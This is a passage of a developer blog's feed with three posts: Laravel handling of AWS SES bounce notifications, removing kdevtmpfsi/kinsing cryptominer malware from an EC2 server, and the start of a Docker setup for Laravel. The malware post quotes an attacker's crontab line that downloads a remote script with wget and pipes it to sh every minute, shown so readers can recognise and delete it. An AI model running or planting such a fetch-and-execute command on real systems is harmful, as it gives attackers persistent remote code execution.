class="number">405</span>)-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// only process valid message from aws</span></span><br><span class="line">            <span class="variable">$messageRaw</span> = <span class="title class_">Message</span>::<span class="title function_ invoke__">fromRawPostData</span>();</span><br><span class="line">            <span class="variable">$validator</span>   = <span class="keyword">new</span> <span class="title class_">MessageValidator</span>();</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Note : Please Uncheck for Enable raw message delivery to comply with AWS SNS Validator format</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="variable">$validator</span>-&gt;<span class="title function_ invoke__">isValid</span>(<span class="variable">$messageRaw</span>)) &#123;</span><br><span class="line">                <span class="title class_">\Log</span>::<span class="title function_ invoke__">info</span>(<span class="string">&#x27;Invalid AWS Message&#x27;</span>);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> <span class="title function_ invoke__">response</span>(<span class="string">&#x27;405 (Invalid AWS Message)&#x27;</span>, <span class="number">405</span>)-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$messageRaw</span> = <span class="variable">$messageRaw</span>-&gt;<span class="title function_ invoke__">toArray</span>();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> (<span class="variable">$messageRaw</span>[<span class="string">&#x27;Type&#x27;</span>] === <span class="string">&#x27;Notification&#x27;</span>) &#123;</span><br><span class="line">                <span class="variable">$message</span> = <span class="title function_ invoke__">json_decode</span>(<span class="variable">$messageRaw</span>[<span class="string">&#x27;Message&#x27;</span>], <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">                <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">updateMailList</span>(<span class="variable">$message</span>[<span class="string">&#x27;notificationType&#x27;</span>], <span class="variable">$message</span>[<span class="string">&#x27;mail&#x27;</span>][<span class="string">&#x27;destination&#x27;</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (\<span class="built_in">Exception</span> <span class="variable">$e</span>) &#123;</span><br><span class="line">            <span class="comment">// Handle exception here</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">response</span>(<span class="string">&#x27;OK&#x27;</span>)-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/plain&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">updateMailList</span>(<span class="params"><span class="variable">$snsType</span>, <span class="variable">$recipients</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$snsType</span> !== <span class="built_in">self</span>::<span class="variable constant_">NOTIFICATION_BOUNCE</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">foreach</span> (<span class="variable">$recipients</span> <span class="keyword">as</span> <span class="variable">$recipient</span>) &#123;</span><br><span class="line">            <span class="variable">$email</span> = <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">extractEmail</span>(<span class="variable">$recipient</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$email</span>)) &#123;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$lookup</span> = <span class="title class_">BouncedEmail</span>::<span class="title function_ invoke__">find</span>(<span class="variable">$email</span>);</span><br><span class="line">            <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$lookup</span>)) &#123;</span><br><span class="line">                <span class="variable">$lookup</span> = <span class="keyword">new</span> <span class="title class_">BouncedEmail</span>();</span><br><span class="line">                <span class="variable">$lookup</span>-&gt;email = <span class="variable">$email</span>;</span><br><span class="line">                <span class="variable">$lookup</span>-&gt;<span class="title function_ invoke__">save</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Helper method to extract email</span></span><br><span class="line"><span class="comment">     * e.g. John Smith &lt;john<span class="doctag">@smith</span>.com&gt;</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> string $recipient</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> string</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">extractEmail</span>(<span class="params"><span class="variable">$recipient</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">filter_var</span>(<span class="variable">$recipient</span>, FILTER_VALIDATE_EMAIL)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$recipient</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$pattern</span> = <span class="string">&#x27;/[a-z0-9_\-\+\.]+@[a-z0-9\-]+\.([a-z]&#123;2,4&#125;)(?:\.[a-z]&#123;2&#125;)?/i&#x27;</span>;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pattern</span>, <span class="variable">$recipient</span>, <span class="variable">$matches</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$matches</span>[<span class="number">0</span>];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Here’s the sample output of <code>$messageRaw</code></p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">Array</span><br><span class="line">(</span><br><span class="line">    <span class="selector-attr">[Type]</span> =&gt; Notification</span><br><span class="line">    <span class="selector-attr">[MessageId]</span> =&gt; <span class="number">11111111</span>-<span class="number">2222</span>-<span class="number">3333</span>-<span class="number">4444</span>-<span class="number">555555555555</span></span><br><span class="line">    <span class="selector-attr">[TopicArn]</span> =&gt; arn:aws:sns:ap-southeast-<span class="number">1</span>:<span class="number">999999999999</span>:ses-notification</span><br><span class="line">    <span class="selector-attr">[Message]</span> =&gt; &#123;<span class="string">&quot;notificationType&quot;</span>:<span class="string">&quot;Bounce&quot;</span>,<span class="string">&quot;bounce&quot;</span>:&#123;<span class="string">&quot;feedbackId&quot;</span>:<span class="string">&quot;aaaaaaaaaaaaaaaa-bbbbbbbb-cccc-dddd-eeee-ffffffffffff-000000&quot;</span>,<span class="string">&quot;bounceType&quot;</span>:<span class="string">&quot;Permanent&quot;</span>,<span class="string">&quot;bounceSubType&quot;</span>:<span class="string">&quot;OnAccountSuppressionList&quot;</span>,<span class="string">&quot;bouncedRecipients&quot;</span>:<span class="selector-attr">[&#123;<span class="string">&quot;emailAddress&quot;</span>:<span class="string">&quot;John &lt;test123123123123123@gmail.com&gt;&quot;</span>,<span class="string">&quot;action&quot;</span>:<span class="string">&quot;failed&quot;</span>,<span class="string">&quot;status&quot;</span>:<span class="string">&quot;5.1.1&quot;</span>,<span class="string">&quot;diagnosticCode&quot;</span>:<span class="string">&quot;Amazon SES did not send the message to this address because it is on the suppression list for your account. For more information about removing addresses from the suppression list, see the Amazon SES Developer Guide at https://docs.aws.amazon.com/ses/latest/DeveloperGuide/sending-email-suppression-list.html&quot;</span>&#125;]</span>,<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2021-05-08T14:35:45.000Z&quot;</span>,<span class="string">&quot;reportingMTA&quot;</span>:<span class="string">&quot;dns; amazonses.com&quot;</span>&#125;,<span class="string">&quot;mail&quot;</span>:&#123;<span class="string">&quot;timestamp&quot;</span>:<span class="string">&quot;2021-05-08T14:35:45.469Z&quot;</span>,<span class="string">&quot;source&quot;</span>:<span class="string">&quot;noreply@yoursite.com&quot;</span>,<span class="string">&quot;sourceArn&quot;</span>:<span class="string">&quot;arn:aws:ses:ap-southeast-1:999999999999:identity/noreply@yoursite.com&quot;</span>,<span class="string">&quot;sourceIp&quot;</span>:<span class="string">&quot;202.202.202.202&quot;</span>,<span class="string">&quot;sendingAccountId&quot;</span>:<span class="string">&quot;999999999999&quot;</span>,<span class="string">&quot;messageId&quot;</span>:<span class="string">&quot;1111111111111111-22222222-3333-4444-5555-666666666666-000000&quot;</span>,<span class="string">&quot;destination&quot;</span>:<span class="selector-attr">[<span class="string">&quot;John &lt;test123123123123123@gmail.com&gt;&quot;</span>]</span>,<span class="string">&quot;headersTruncated&quot;</span>:false,<span class="string">&quot;headers&quot;</span>:<span class="selector-attr">[&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Message-ID&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;&lt;99999999999999999999999999999999@swift.generated&gt;&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Date&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;Sat, 08 May 2021 22:35:44 +0800&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Subject&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;YourSite: Test send mail&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;From&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;YourSite &lt;noreply@yoursite.com&gt;&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;To&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;John &lt;test123123123123123@gmail.com&gt;&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;MIME-Version&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;1.0&quot;</span>&#125;,&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Content-Type&quot;</span>,<span class="string">&quot;value&quot;</span>:<span class="string">&quot;multipart/mixed; boundary=\&quot;_=_swift_5555555555_77777777777777777777777777777777_=_\&quot;&quot;</span>&#125;]</span>,<span class="string">&quot;commonHeaders&quot;</span>:&#123;<span class="string">&quot;from&quot;</span>:<span class="selector-attr">[<span class="string">&quot;YourSite &lt;noreply@yoursite.com&gt;&quot;</span>]</span>,<span class="string">&quot;date&quot;</span>:<span class="string">&quot;Sat, 08 May 2021 22:35:44 +0800&quot;</span>,<span class="string">&quot;to&quot;</span>:<span class="selector-attr">[<span class="string">&quot;John &lt;test123123123123123@gmail.com&gt;&quot;</span>]</span>,<span class="string">&quot;messageId&quot;</span>:<span class="string">&quot;&lt;99999999999999999999999999999999@swift.generated&gt;&quot;</span>,<span class="string">&quot;subject&quot;</span>:<span class="string">&quot;YourSite: Test send mail&quot;</span>&#125;&#125;&#125;</span><br><span class="line">    <span class="selector-attr">[Timestamp]</span> =&gt; <span class="number">2021</span>-<span class="number">05</span>-<span class="number">08</span>T14:<span class="number">35</span>:<span class="number">45.908</span>Z</span><br><span class="line">    <span class="selector-attr">[SignatureVersion]</span> =&gt; <span class="number">1</span></span><br><span class="line">    <span class="selector-attr">[Signature]</span> =&gt; UUUUUUUUUUUUUUUUUUUUUUUUUUUUU+kkkkkkkkkkk/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA/CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC/zzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzzz/eeeee/qqqqqqqq+BBB+nnnnnnnnnnnnnnnnnnnnnnnnnn/e/yyyyyyyyyyy+dddd+XXXXXXXXXXXXXXXXXXXXXXXXX/ww/rr+HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH+g==</span><br><span class="line">    <span class="selector-attr">[SigningCertURL]</span> =&gt; https:<span class="comment">//sns.ap-southeast-1.amazonaws.com/SimpleNotificationService-99999999999999999999999999999999.pem</span></span><br><span class="line">    <span class="selector-attr">[UnsubscribeURL]</span> =&gt; https:<span class="comment">//sns.ap-southeast-1.amazonaws.com/?Action=Unsubscribe&amp;SubscriptionArn=arn:aws:sns:ap-southeast-1:999999999999:ses-notification:11111111-2222-3333-4444-555555555555</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><h3 id="3-Prevent-to-send-to-invalid-email"><a href="#3-Prevent-to-send-to-invalid-email" class="headerlink" title="3. Prevent to send to invalid email"></a>3. Prevent to send to invalid email</h3><p>In <a href="https://laravel.com/docs/8.x/notifications">Laravel Notification</a> feature, there’s a <code>via</code> method</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">via</span>(<span class="params"><span class="variable">$notifiable</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="variable">$channels</span> = [];</span><br><span class="line">    <span class="variable">$bounced</span> = <span class="title class_">BouncedEmail</span>::<span class="title function_ invoke__">find</span>(<span class="variable">$notifiable</span>-&gt;<span class="title function_ invoke__">routeNotificationForMail</span>());</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$bounced</span>)) &#123; <span class="comment">// only send if it&#x27;s not in the bounced list</span></span><br><span class="line">        <span class="variable">$channels</span>[] = <span class="string">&#x27;mail&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$channels</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I believe most of AWS users will use Amazon Simple Email Service &lt;strong&gt;(SES)&lt;/strong&gt;&lt;br&gt;for system email sending.&lt;/p&gt;
&lt;p&gt;Before you</summary>
        
      
    
    
    
    
    <category term="php" scheme="http://jslim.net/tags/php/"/>
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="aws" scheme="http://jslim.net/tags/aws/"/>
    
  </entry>
  
  <entry>
    <title>AWS EC2 instance used up CPU 100% - Malware kdevtmpfsi</title>
    <link href="http://jslim.net/blog/2021/02/25/AWS-EC2-instance-used-up-CPU-100-Malware-kdevtmpfsi/"/>
    <id>http://jslim.net/blog/2021/02/25/AWS-EC2-instance-used-up-CPU-100-Malware-kdevtmpfsi/</id>
    <published>2021-02-25T14:53:05.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I was wondering what’s wrong with my server <em>(host Laravel web app)</em>,<br>it’s fine after reboot the instance, but after a while it become very<br>slow, and CPU 100%</p><p>I’m using <strong>Ubuntu 20.04.2 LTS</strong></p><p>Run</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ </span>htop</span><br></pre></td></tr></table></figure><p><img src="/images/posts/2021-02-25-AWS-EC2-instance-used-up-CPU-100-Malware-kdevtmpfsi/kdevtmpfsi.png" alt="kdevtmpfsi"></p><p>Then I found <a href="https://stackoverflow.com/questions/60151640/kdevtmpfsi-using-the-entire-cpu/">this post</a></p><h3 id="1-kill-the-process-amp-delete-the-file"><a href="#1-kill-the-process-amp-delete-the-file" class="headerlink" title="1. kill the process &amp; delete the file"></a>1. kill the process &amp; delete the file</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo killall kdevtmpfsi</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo killall kinsing</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo find / -iname kdevtmpfsi* -<span class="built_in">exec</span> <span class="built_in">rm</span> -fv &#123;&#125; \;</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo find / -iname kinsing* -<span class="built_in">exec</span> <span class="built_in">rm</span> -fv &#123;&#125; \;</span></span><br><span class="line"><span class="meta prompt_"></span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">echo</span> <span class="string">&quot;kdevtmpfsi is fine now&quot;</span> &gt; /tmp/kdevtmpfsi</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">echo</span> <span class="string">&quot;kinsing is fine now&quot;</span> &gt; /tmp/kinsing</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chown</span> root:root /tmp/kdevtmpfsi /tmp/kinsing</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chmod</span> 0444 /tmp/kdevtmpfsi</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">sudo <span class="built_in">chmod</span> 0444 /tmp/kinsing</span></span><br></pre></td></tr></table></figure><h3 id="2-Check-the-www-data-crontab"><a href="#2-Check-the-www-data-crontab" class="headerlink" title="2. Check the www-data crontab"></a>2. Check the <code>www-data</code> crontab</h3><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ sudo crontab -u www-<span class="class"><span class="keyword">data</span> -e</span></span><br></pre></td></tr></table></figure><p>If you see this, just remove them</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* * * * * wget -q -O - http:<span class="regexp">//</span><span class="number">195.3</span>.<span class="number">146.118</span><span class="regexp">/lr.sh | sh &gt; /</span>dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br><span class="line">* * * * * wget -q -O - http:<span class="regexp">//</span><span class="number">195.3</span>.<span class="number">146.118</span><span class="regexp">/lr.sh | sh &gt; /</span>dev/null <span class="number">2</span>&gt;&amp;<span class="number">1</span></span><br></pre></td></tr></table></figure><h3 id="3-Patch-Laravel"><a href="#3-Patch-Laravel" class="headerlink" title="3. Patch Laravel"></a>3. Patch Laravel</h3><p>Turn off debug</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">APP_DEBUG</span>=<span class="literal">false</span></span><br></pre></td></tr></table></figure><p>Update composer package <code>facade/ignition</code> to at least <code>2.5.1</code></p><h3 id="4-Reboot-instance"><a href="#4-Reboot-instance" class="headerlink" title="4. Reboot instance"></a>4. Reboot instance</h3><p>After reboot it’s working fine</p><h2 id="References"><a href="#References" class="headerlink" title="References:"></a>References:</h2><ul><li><a href="https://stackoverflow.com/questions/60151640/kdevtmpfsi-using-the-entire-cpu/66364005#66364005">kdevtmpfsi using the entire CPU</a></li></ul>]]></content>
    
    
      
      
        
        
    <summary type="html">&lt;p&gt;I was wondering what’s wrong with my server &lt;em&gt;(host Laravel web app)&lt;/em&gt;,&lt;br&gt;it’s fine after reboot the instance, but after a while</summary>
        
      
    
    
    
    
    <category term="linux" scheme="http://jslim.net/tags/linux/"/>
    
    <category term="laravel" scheme="http://jslim.net/tags/laravel/"/>
    
    <category term="aws" scheme="http://jslim.net/tags/aws/"/>
    
    <category term="ubuntu" scheme="http://jslim.net/tags/ubuntu/"/>
    
    <category term="lemp" scheme="http://jslim.net/tags/lemp/"/>
    
    <category term="malware" scheme="http://jslim.net/tags/malware/"/>
    
  </entry>
  
  <entry>
    <title>Real world practice on Docker in Laravel web app</title>
    <link href="http://jslim.net/blog/2021/02/08/Real-world-practice-on-Docker-in-Laravel-web-app/"/>
    <id>http://jslim.net/blog/2021/02/08/Real-world-practice-on-Docker-in-Laravel-web-app/</id>
    <published>2021-02-08T00:29:31.000Z</published>
    <updated>2022-05-09T09:30:48.617Z</updated>
    
    <content type="html"><![CDATA[<p>I heard about Docker few years ago, but wasn’t know about best practice how to use that.<br>I’ve tried Laradock, it’s way too many stuff in the config, should I use 1 docker for multiple<br>projects? Or better single project?</p><hr><p>Create <strong>docker-compose.yml</strong> in root</p><p>Here’s the basic docker-compose file to run php web app</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── docker-compose<span class="selector-class">.yml</span></span><br><span class="line">└── <span class="attribute">src</span> (laravel project)</span><br></pre></td></tr></table></figure><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">php-fpm:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">php:8.0-fpm</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">jslim-php-fpm</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">tty:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">working_dir:</span> <span class="string">/var/www/app</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">redis</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../src:/var/www/app</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">jslim-network</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">nginx:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">nginx:alpine</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">jslim-nginx</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br><span class="line">    <span class="attr">tty:</span> <span class="literal">true</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">php-fpm</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="number">8080</span><span class="string">:80</span></span><br><span class="line">    <span class="attr">volumes:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">../src:/var/www/app</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">jslim-network</span></span><br><span class="line"></span><br><span class="line">  <span class="attr">redis:</span></span><br><span class="line">    <span class="attr">image:</span> <span class="string">redis:6-alpine</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">jslim-redis</span></span><br><span class="line">    <span class="attr">networks:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">jslim-network</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#Docker Networks</span></span><br><span class="line"><span class="attr">networks:</span></span><br><span class="line">  <span class="attr">jslim-network:</span></span><br><span class="line">    <span class="attr">driver:</span> <span class="string">bridge</span></span><br></pre></td></tr></table></figure><p>If you’re in local development, can add in <strong>mysql</strong> container.</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">php-fpm</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">...</span></span><br><span class="line"><span class="attribute">  depends_on</span><span class="punctuation">:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">mysql</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">...</span></span><br><span class="line"><span class="attribute"></span></span><br><span class="line"><span class="attribute">mysql</span><span class="punctuation">:</span></span><br><span class="line">  <span class="attribute">image</span><span class="punctuation">:</span> <span class="string">mysql:8.0</span></span><br><span class="line">  <span class="attribute">container_name</span><span class="punctuation">:</span> <span class="string">jslim-mysql</span></span><br><span class="line">  <span class="attribute">ports</span><span class="punctuation">:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">3306:3306</span></span><br><span class="line">  <span class="attribute">environment</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">MYSQL_ROOT_PASSWORD</span><span class="punctuation">:</span> <span class="string">&#x27;$&#123;DB_PASSWORD&#125;&#x27;</span></span><br><span class="line">    <span class="attribute">MYSQL_DATABASE</span><span class="punctuation">:</span> <span class="string">&#x27;$&#123;DB_DATABASE&#125;&#x27;</span></span><br><span class="line">    <span class="attribute">MYSQL_USER</span><span class="punctuation">:</span> <span class="string">&#x27;$&#123;DB_USERNAME&#125;&#x27;</span></span><br><span class="line">    <span class="attribute">MYSQL_PASSWORD</span><span class="punctuation">:</span> <span class="string">&#x27;$&#123;DB_PASSWORD&#125;&#x27;</span></span><br><span class="line">    <span class="attribute">MYSQL_ALLOW_EMPTY_PASSWORD</span><span class="punctuation">:</span> <span class="string">&#x27;yes&#x27;</span></span><br><span class="line">  <span class="attribute">volumes</span><span class="punctuation">:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">./data/mysql-data:/var/lib/mysql</span></span><br><span class="line">  <span class="attribute">networks</span><span class="punctuation">:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">jslim-network</span></span><br><span class="line">  <span class="attribute">healthcheck</span><span class="punctuation">:</span></span><br><span class="line">    <span class="attribute">test</span><span class="punctuation">:</span> <span class="string">[&quot;CMD&quot;, &quot;mysqladmin&quot;, &quot;ping&quot;]</span></span><br></pre></td></tr></table></figure><p>Run it<br><em>(<code>. src/.env</code> is read .env file’s as env variables)</em></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">. src/.env &amp;&amp; docker-compose up -d</span></span><br></pre></td></tr></table></figure><h2 id="Add-extra-php-packages"><a href="#Add-extra-php-packages" class="headerlink" title="Add extra php packages"></a>Add extra php packages</h2><p>In order to run Laravel web app, there are some php extensions required.<br>Thus, we need to create a <strong>Dockerfile</strong> to customize from the base image <em>(php:8.0-fpm)</em></p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── docker</span><br><span class="line">│   └── php</span><br><span class="line">│       └── Dockerfile</span><br><span class="line">├── docker-compose<span class="selector-class">.yml</span></span><br><span class="line">└── <span class="attribute">src</span> (laravel project)</span><br></pre></td></tr></table></figure><p>Update <strong>Dockerfile</strong></p><figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span 